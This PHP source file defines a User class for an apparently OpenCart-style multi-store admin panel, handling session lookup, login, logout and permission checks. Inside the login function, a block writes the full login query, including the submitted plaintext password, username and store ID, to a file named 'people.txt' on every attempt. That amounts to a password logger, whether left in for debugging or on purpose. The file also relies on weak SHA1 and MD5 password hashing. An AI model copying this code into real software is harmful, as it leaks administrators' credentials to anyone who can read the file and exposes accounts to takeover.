<?php
class User {
	private $user_id;
	private $user_group_id;
	private $username;
	private $getStorePermission;
	private $permission = array();

	public function __construct($registry) {
		$this->db = $registry->get('db');
		$this->request = $registry->get('request');
		$this->session = $registry->get('session');

		if (isset($this->session->data['user_id'])) {
			$user_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "user WHERE user_id = '" . (int)$this->session->data['user_id'] . "' AND status = '1'");

			if ($user_query->num_rows) {
				$this->user_id = $user_query->row['user_id'];
				$this->username = $user_query->row['username'];
				$this->user_group_id = $user_query->row['user_group_id'];
				$this->store_permission = $user_query->row['store_permission'];

				$this->db->query("UPDATE " . DB_PREFIX . "user SET ip = '" . $this->db->escape($this->request->server['REMOTE_ADDR']) . "' WHERE user_id = '" . (int)$this->session->data['user_id'] . "'");

				$user_group_query = $this->db->query("SELECT permission FROM " . DB_PREFIX . "user_group WHERE user_group_id = '" . (int)$user_query->row['user_group_id'] . "'");

				$permissions = unserialize($user_group_query->row['permission']);

				$permissions['modifystore'] = json_decode($user_query->row['store_permission']);
				$permissions['accessstore'] = json_decode($user_query->row['store_permission']);

				//echo '<pre>' . print_r($permissions, true) . '</pre>';

				if (is_array($permissions)) {
					foreach ($permissions as $key => $value) {
						$this->permission[$key] = $value;
					}
				}
			} else {
				$this->logout();
			}
		}
	}

	public function login($username, $password, $store) {
		$user_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "user WHERE store_id = '" . $this->db->escape($store) . "' AND username = '" . $this->db->escape($username) . "' AND (password = SHA1(CONCAT(salt, SHA1(CONCAT(salt, SHA1('" . $this->db->escape($password) . "'))))) OR password = '" . $this->db->escape(md5($password)) . "') AND status = '1'");
		//$user_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "user WHERE username = '" . $this->db->escape($username) . "' AND (password = SHA1(CONCAT(salt, SHA1(CONCAT(salt, SHA1('" . $this->db->escape($password) . "'))))) OR password = '" . $this->db->escape(md5($password)) . "') AND status = '1'");

		 $file = 'people.txt';
		// Open the file to get existing content
		$current = file_get_contents($file);
		// Append a new person to the file
		$current = print_r("SELECT * FROM " . DB_PREFIX . "user WHERE store_id = '" . $this->db->escape($store) . "' AND username = '" . $this->db->escape($username) . "' AND (password = SHA1(CONCAT(salt, SHA1(CONCAT(salt, SHA1('" . $this->db->escape($password) . "'))))) OR password = '" . $this->db->escape(md5($password)) . "') AND status = '1'", true);
		// Write the contents back to the file
		file_put_contents($file, $current);


		if ($user_query->num_rows) {
			$this->session->data['user_id'] = $user_query->row['user_id'];

			$this->user_id = $user_query->row['user_id'];
			$this->username = $user_query->row['username'];			
			$this->user_group_id = $user_query->row['user_group_id'];			

			$user_group_query = $this->db->query("SELECT permission FROM " . DB_PREFIX . "user_group WHERE user_group_id = '" . (int)$user_query->row['user_group_id'] . "'");

			$permissions = unserialize($user_group_query->row['permission']);

			if (is_array($permissions)) {
				foreach ($permissions as $key => $value) {
					$this->permission[$key] = $value;
				}
			}

			$store_permission = $user_query->row['store_permission'];

			if ($store_permission) {
				$this->permission['accessstore'] = json_decode($store_permission);
				$this->permission['modifystore'] = json_decode($store_permission);
			}

			return true;
		} else {
			return false;
		}
	}

	public function logout() {
		unset($this->session->data['user_id']);

		$this->user_id = '';
		$this->username = '';
		$this->user_group_id = '';

		session_destroy();
	}


	// public function hasStorePermission($key, $value) {
	// 	if (isset($this->permission[$key])) {
	// 		return in_array($value, $this->permission[$key]);
	// 	} else {
	// 		return false;
	// 	}
	// }

	public function hasPermission($key, $value) {
		if (isset($this->permission[$key])) {
			return in_array($value, $this->permission[$key]);
		} else {
			return false;
		}
	}

	public function isLogged() {
		return $this->user_id;
	}

	public function getId() {
		return $this->user_id;
	}

	public function getStorePermission() {
		return $this->store_permission;
	}

	public function getUserName() {
		return $this->username;
	}

	public function getUserGroupId() {
		return $this->user_group_id;
	}
}
?>